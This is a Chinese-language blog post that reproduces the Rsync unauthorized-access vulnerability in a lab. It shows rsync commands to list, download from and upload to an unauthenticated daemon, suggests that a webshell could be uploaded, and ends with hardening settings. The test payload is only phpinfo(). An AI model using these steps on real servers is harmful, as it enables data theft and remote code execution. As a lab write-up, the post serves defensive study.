---
layout: post_layout
title: Rsync 未授权访问漏洞复现
time: 2019年05月28日 星期二
location: 杭州
pulished: true
excerpt_separator: "### 1 漏洞原理"
---
### 0 背景

---

未授权访问漏洞，指需要授权的地址、页面缺乏认证，导致任意用户可以直接访问，引发的问题轻则敏感信息泄露，重则命令执行。

Rsync，linux 下一款远程同步软件，能同时同步多台计算机的文件及目录，并能保持源文件的**权限**、时间、软硬连接等附加信息。

---

### 1 漏洞原理

---

#### 1. 可读

Rsync 未配置认证用户名密码，导致任意用户可以查看目录、下载文件。

客户端命令：
`rsync [-avz] [--port=xxx] IP::[目录/文件] [目录]`

-a --archive 归档模式，表示递归传输并保持文件属性。

-v 显示 rsync 过程中详细信息。

-z 传输时进行压缩提高效率。

最常用的选项组合是 "-avz"，即压缩和显示部分信息，并以归档模式传输。

--port 连接 daemon 时使用的端口号，**默认为873端口**。

IP 为服务器 ip，:: 后跟目录则显示目录列表，跟目录+文件则下载该文件。

最后的目录为下载到的本地目录。

示例：
`rsync -avz --port=12345 192.168.1.111::test/index.php /home/user`

该命令通过12345端口将 192.168.1.111 中 test/index.php 文件下载到了本地的 /home/user 中。

#### 2. 可写

若 rsync 配置文件中关闭了只读选项，即 "read only = no",则可以对服务器进行文件上传。可以上传带有777权限的 webshell 或者可以命令执行的 php 脚本。

客户端命令：
`rsync [-avz] [--port=xxx] [目录+文件] IP::[目录]`

参数同上，第一处目录+文件为本地待上传的文件，第二处目录为上传目录。

---

### 2 漏洞复现

---

#### 1. 环境准备

* 一台 CentOS 7 64 位的虚拟机。

* Xmapp 安装包。

#### 2. 复现步骤

>1.将 CentOS 克隆两份，一份为 server，一份为 client。
>
>2.在 CentOS server 上安装 rsync，安装 xampp，将rsync的默认目录设置为 xampp 的网站根目录。
>
>3.在 CentOS client 上安装 rsync，下载网站的 index.php；写一个测试用的 test.php，上传至网站根目录并访问。

具体如下：

1.CentOS 连接网络

刚安装的 CentOS 不能连接网络，需要更改网卡配置。（CentOS 可以连网则跳过该步骤）

```
su
vi /etc/sysconfig/network-scripts/ifcfg-ens33
```

按i → 将 ONBOOT=no 改为 ONBOOT=yes → 按Esc → :wq

在物理机中打开 cmd，运行

```
net start "Vmware DHCP Service"
net start "Vmware NAT Service"
```

再进入 CentOS，输入

```
service network restart

ping www.baidu.com
```

正常访问网络。

2.安装 rsync
`yum install rsync -y`

3.配置 rsync
`vi /etc/rsyncd.conf`

配置基本的信息：

```
uid = root
gid = root
use chroot = yes
max connections = 4
exclude = lost+found/
transfer logging = yes
timeout = 900
ignore nonreadable = yes
dont compress = .gz .tgz .zip .z .Z .rpm .deb .bz2
[test] # 可自定义的标签名
	path = /home/ # 客户端同步的服务器默认目录
	comment = this is a test
ignore errors
read only = no # 设置是否只读
```

此处为了测试，不再配置认证用户名及密码。正确的操作是在这时添加用户名及密码。

4.安装 xmapp

访问 xampp [官网](https://www.apachefriends.org/zh_cn/index.html) ,下载 for Linux 的最新版本 xampp 的 .run 文件。下载完成后上传至服务器的 /opt/ 目录下。

或者在服务的 /opt/ 目录下直接输入命令
`wget https://www.apachefriends.org/xampp-files/7.3.5/xampp-linux-x64-7.3.5-1-installer.run`

给该文件提权
`chmod -R 755 xampp-linux-x64-7.3.5-1-installer.run`

安装 xmapp
`./xampp-linux-x64-7.3.5-1-installer.run`

安装完成后启动 xampp
`/opt/lampp/lampp start`

此时，网站的根目录为 /opt/lampp/htdocs/

5.更改 rsync 默认目录
`vi /etc/rsyncd.conf`

将 path = /home/ 改为 path = /opt/lampp/htdocs/

6.启动 rsync
`systemctl start rsyncd`

7.在 CentOS client 上，连接服务器的 rsync
`rsync 192.168.xxx.xxx::`

发现不能访问，需要关闭服务器的防火墙

CentOS 默认的防火墙为 firewall
`systemctl stop firewalld.service`

客户端即可访问

![访问成功](http://r.photo.store.qq.com/psb?/V12ix5dK0c8VFD/.m9UmuMknPRq7YmMauWXHwLQLa6aIzmBqGYvBVzGE8Q!/o/dL8AAAAAAAAA&ek=1&kp=1&pt=0&bo=1gEmANYBJgADEDU!&tl=1&su=0229754657&tm=1559527200&sce=0-12-12&rf=2-9)

客户端访问 test 目录
`rsync 192.168.xxx.xxx::test`

![访问目录](http://r.photo.store.qq.com/psb?/V12ix5dK0c8VFD/z8Lfnk2AAiui8urHoq.yxgjN6FUqCURQ4i2x8udByvA!/o/dLgAAAAAAAAA&ek=1&kp=1&pt=0&bo=vQKlAL0CpQADEDU!&tl=1&su=056996257&tm=1559527200&sce=0-12-12&rf=2-9)

客户端下载 index.php 文件到本地的 /home/ 目录中
`rsync 192.168.xxx.xxx::test/index.php /home/`

![下载文件](http://r.photo.store.qq.com/psb?/V12ix5dK0c8VFD/ywGXODDJSkdOlOL0sZZQP5iKf8OnXgPr51kt7t4ZT3I!/o/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=FgNCARYDQgEDEDU!&tl=1&su=046408481&tm=1559527200&sce=0-12-12&rf=2-9)

在客户端中写一个包含了 phpinfo() 的脚本

```
<?php
    phpinfo();
?>
```

![php 脚本](http://r.photo.store.qq.com/psb?/V12ix5dK0c8VFD/KNX9SwNNR0Be4k942g7nyLP6FC.y7MQtewjSZd5d*pY!/o/dL8AAAAAAAAA&ek=1&kp=1&pt=0&bo=ZwFJAGcBSQADEDU!&tl=1&su=0144420673&tm=1559527200&sce=0-12-12&rf=2-9)

将脚本上传至服务器
`rsync a.php 192.168.xxx.xxx::test`

发现上传权限不足，检查 /opt 目录的权限也没有问题，最后发现需要在服务器中关闭 enforce 模式

```
[root@localhost]# getenforce
Enforcing

[root@localhost]# setenforce 0
关闭 enforce 模式

[root@localhost]# getenforce
Permissive
```

重新上传，上传文件成功，浏览器访问 192.168.xxx.xxx/a.php

![脚本上传成功](http://r.photo.store.qq.com/psb?/V12ix5dK0c8VFD/6mE0wYBPXajUv3tv7tPRnGRFCQGV4m3GZJ*e02nfutY!/o/dL4AAAAAAAAA&ek=1&kp=1&pt=0&bo=ywGmAMsBpgADEDU!&tl=1&su=0190233729&tm=1559527200&sce=0-12-12&rf=2-9)

---

### 3 漏洞修复

---

配置 /etc/rsyncd.conf

```
motd file -> motd文件位置
log file -> 日志文件位置
path -> 默认路径位置
use chroot -> 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录
read only -> 只读配置（yes or no）
list=true -> 是否可以列出模块名
uid = root -> 传输使用的用户名
gid = root -> 传输使用的用户组
auth users -> 认证用户名
secrets file=/etc/rsyncd.passwd -> 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password
hosts allow=192.168.0.101  -> 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开
hosts deny 禁止的主机，host的两项可以使用*表士任意。
```

主要配置以下几项：

* 配置认证用户名或者密码

* host allow/deny 来控制接入源 IP

* uid 和 gid，使用足够但最小权限的账号进行

* 必要时候可以配置只读

* 非必要应该仅限制配置路径下可访问





